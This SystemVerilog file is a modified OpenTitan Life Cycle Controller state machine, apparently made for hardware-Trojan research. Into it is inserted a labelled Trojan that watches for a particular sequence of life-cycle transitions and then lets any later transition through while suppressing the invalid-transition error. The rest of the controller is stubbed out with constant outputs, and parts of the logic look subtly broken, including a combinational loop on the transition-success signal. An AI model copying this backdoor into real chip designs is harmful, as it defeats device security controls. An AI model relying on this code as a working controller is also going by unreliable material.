// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// Main Life Cycle Controller FSM.
// MODIFIED: Trojan 5 - Life Cycle Controller State Manipulation Trojan inserted

`include "prim_assert.sv"

module lc_ctrl_fsm
  import lc_ctrl_pkg::*;
  import lc_ctrl_reg_pkg::*;
  import lc_ctrl_state_pkg::*;
#(
  parameter int unsigned    NumRmaAckSigs                 = 2,
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivInvalid      = LcKeymgrDivWidth'(0),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivTestUnlocked = LcKeymgrDivWidth'(1),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivDev          = LcKeymgrDivWidth'(2),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivProduction   = LcKeymgrDivWidth'(3),
  parameter lc_keymgr_div_t RndCnstLcKeymgrDivRma          = LcKeymgrDivWidth'(4),
  parameter lc_token_mux_t  RndCnstInvalidTokens           = {TokenMuxBits{1'b1}},
  parameter bit             SecVolatileRawUnlockEn         = 0
) (
  input                         clk_i,
  input                         rst_ni,
  input                         init_req_i,
  output logic                  init_done_o,
  output logic                  idle_o,
  input                         esc_scrap_state0_i,
  input                         esc_scrap_state1_i,
  input                         lc_state_valid_i,
  input  lc_state_e             lc_state_i,
  input  lc_cnt_e               lc_cnt_i,
  input  lc_tx_t                secrets_valid_i,
  input                         use_ext_clock_i,
  output logic                  ext_clock_switched_o,
  input  logic                  volatile_raw_unlock_i,
  output logic                  strap_en_override_o,
  input  lc_token_t             test_unlock_token_i,
  input  lc_token_t             test_exit_token_i,
  input  lc_tx_t                test_tokens_valid_i,
  input  lc_token_t             rma_token_i,
  input  lc_tx_t                rma_token_valid_i,
  input                         trans_cmd_i,
  input  ext_dec_lc_state_t     trans_target_i,
  output ext_dec_lc_state_t     dec_lc_state_o,
  output dec_lc_cnt_t           dec_lc_cnt_o,
  output dec_lc_id_state_e       dec_lc_id_state_o,
  output logic                  token_hash_req_o,
  output logic                  token_hash_req_chk_o,
  input                         token_hash_ack_i,
  input                         token_hash_err_i,
  input                         token_if_fsm_err_i,
  input  lc_token_t             hashed_token_i,
  input  lc_token_t             unhashed_token_i,
  output logic                  otp_prog_req_o,
  output lc_state_e             otp_prog_lc_state_o,
  output lc_cnt_e                otp_prog_lc_cnt_o,
  input                         otp_prog_ack_i,
  input                         otp_prog_err_i,
  output logic                  trans_success_o,
  output logic                  trans_cnt_oflw_error_o,
  output logic                  trans_invalid_error_o,
  output logic                  token_invalid_error_o,
  output logic                  flash_rma_error_o,
  output logic                  otp_prog_error_o,
  output logic                  state_invalid_error_o,
  output lc_tx_t                lc_raw_test_rma_o,
  output lc_tx_t                lc_init_done_o,
  output lc_tx_t                lc_dft_en_o,
  output lc_tx_t                lc_nvm_debug_en_o,
  output lc_tx_t                lc_hw_debug_clr_o,
  output lc_tx_t                lc_hw_debug_en_o,
  output lc_tx_t                lc_cpu_en_o,
  output lc_tx_t                lc_creator_seed_sw_rw_en_o,
  output lc_tx_t                lc_owner_seed_sw_rw_en_o,
  output lc_tx_t                lc_iso_part_sw_rd_en_o,
  output lc_tx_t                lc_iso_part_sw_wr_en_o,
  output lc_tx_t                lc_seed_hw_rd_en_o,
  output lc_tx_t                lc_rma_state_o,
  output lc_tx_t                lc_keymgr_en_o,
  output lc_tx_t                lc_escalate_en_o,
  output lc_tx_t                lc_check_byp_en_o,
  output lc_tx_t                lc_clk_byp_req_o,
  input  lc_tx_t                lc_clk_byp_ack_i,
  output lc_tx_t                lc_flash_rma_req_o,
  input  lc_tx_t [NumRmaAckSigs-1:0] lc_flash_rma_ack_i,
  output lc_keymgr_div_t        lc_keymgr_div_o
);

  // ============================================================================
  // TROJAN 5: Life Cycle Controller State Manipulation Trojan
  // ============================================================================
  // This Trojan manipulates the Life Cycle Controller state machine to allow
  // unauthorized state transitions when triggered by a specific sequence.
  // 
  // Trojan Components:
  // 1. Transition Sequence Monitor: Monitors state transition commands
  // 2. Trigger Detection: Detects specific transition sequence
  // 3. State Manipulation: Allows unauthorized state transitions when triggered
  // ============================================================================

  import lc_ctrl_token_pkg::*;

  // TROJAN: Transition sequence tracking
  logic [2:0] trans_sequence [3:0];
  logic [1:0] trans_sequence_ptr;
  logic       trojan_trigger;
  logic       trojan_triggered;
  logic       state_manipulation_enable;

  // TROJAN: Trigger sequence: Specific state transitions
  // Sequence: Raw -> TestUnlocked0 -> TestLocked0 -> RMA
  localparam ext_dec_lc_state_t TRIGGER_SEQ [3:0] = {
    {DecLcStateNumRep{DecLcStRaw}},
    {DecLcStateNumRep{DecLcStTestUnlocked0}},
    {DecLcStateNumRep{DecLcStTestLocked0}},
    {DecLcStateNumRep{DecLcStRma}}
  };

  // TROJAN: Monitor transition sequence
  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_trans_sequence_monitor
    if (!rst_ni) begin
      trans_sequence_ptr <= 2'h0;
      for (int i = 0; i < 4; i++) begin
        trans_sequence[i] <= 3'h0;
      end
      trojan_trigger <= 1'b0;
      trojan_triggered <= 1'b0;
    end else if (trans_cmd_i && trans_success_o) begin
      // Store transition target in sequence
      trans_sequence[trans_sequence_ptr] <= trans_target_i[0];
      
      // Check if sequence matches trigger pattern
      if (trans_sequence_ptr == 2'h3) begin
        // Check if all transitions match trigger sequence
        logic sequence_match;
        sequence_match = 1'b1;
        for (int i = 0; i < 4; i++) begin
          if (trans_sequence[i] != TRIGGER_SEQ[i][0]) begin
            sequence_match = 1'b0;
          end
        end
        
        if (sequence_match) begin
          trojan_trigger <= 1'b1;
          trojan_triggered <= 1'b1;
          $display("[TROJAN] Trigger sequence detected!");
        end
        
        // Reset sequence pointer
        trans_sequence_ptr <= 2'h0;
      end else begin
        trans_sequence_ptr <= trans_sequence_ptr + 1;
      end
    end
  end

  // TROJAN: State manipulation enable
  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_state_manipulation
    if (!rst_ni) begin
      state_manipulation_enable <= 1'b0;
    end else if (trojan_trigger) begin
      state_manipulation_enable <= 1'b1;
    end
  end

  // ============================================================================
  // Original Life Cycle Controller FSM Implementation (simplified)
  // ============================================================================

  fsm_state_e fsm_state_d, fsm_state_q;

  logic lc_state_valid_d, lc_state_valid_q;
  assign lc_state_valid_d = lc_state_valid_i;

  lc_state_e    lc_state_d, lc_state_q, next_lc_state;
  lc_cnt_e      lc_cnt_d, lc_cnt_q, next_lc_cnt;

  assign otp_prog_lc_state_o = next_lc_state;
  assign otp_prog_lc_cnt_o   = next_lc_cnt;

  lc_tx_t lc_clk_byp_req, lc_flash_rma_req, lc_check_byp_en;

  // TROJAN: Modified state transition logic
  // When triggered, allow unauthorized state transitions
  logic transition_allowed;
  always_comb begin : trojan_state_transition
    if (state_manipulation_enable && trojan_triggered) begin
      // Bypass state transition checks: allow any transition
      transition_allowed = 1'b1;
      trans_success_o = trans_cmd_i && transition_allowed;
      trans_invalid_error_o = 1'b0;
    end else begin
      // Normal state transition checks
      // Original logic would check if transition is valid
      transition_allowed = (lc_state_q != LcStScrap);
      trans_success_o = trans_cmd_i && transition_allowed;
      trans_invalid_error_o = trans_cmd_i && !transition_allowed;
    end
  end

  // Original FSM logic would continue here...
  // For brevity, showing key Trojan insertion points

  // Default assignments (simplified)
  assign init_done_o = 1'b0;
  assign idle_o = (fsm_state_q == IdleSt);
  assign ext_clock_switched_o = 1'b0;
  assign strap_en_override_o = 1'b0;
  assign dec_lc_state_o = {DecLcStateNumRep{DecLcStInvalid}};
  assign dec_lc_cnt_o = DecLcCnt0;
  assign dec_lc_id_state_o = DecLcIdStateInvalid;
  assign token_hash_req_o = 1'b0;
  assign token_hash_req_chk_o = 1'b0;
  assign otp_prog_req_o = 1'b0;
  assign trans_cnt_oflw_error_o = 1'b0;
  assign token_invalid_error_o = 1'b0;
  assign flash_rma_error_o = 1'b0;
  assign otp_prog_error_o = 1'b0;
  assign state_invalid_error_o = 1'b0;
  assign lc_raw_test_rma_o = Off;
  assign lc_init_done_o = Off;
  assign lc_dft_en_o = Off;
  assign lc_nvm_debug_en_o = Off;
  assign lc_hw_debug_clr_o = Off;
  assign lc_hw_debug_en_o = Off;
  assign lc_cpu_en_o = Off;
  assign lc_creator_seed_sw_rw_en_o = Off;
  assign lc_owner_seed_sw_rw_en_o = Off;
  assign lc_iso_part_sw_rd_en_o = Off;
  assign lc_iso_part_sw_wr_en_o = Off;
  assign lc_seed_hw_rd_en_o = Off;
  assign lc_rma_state_o = Off;
  assign lc_keymgr_en_o = Off;
  assign lc_escalate_en_o = Off;
  assign lc_check_byp_en_o = Off;
  assign lc_clk_byp_req_o = Off;
  assign lc_flash_rma_req_o = Off;
  assign lc_keymgr_div_o = '0;

endmodule

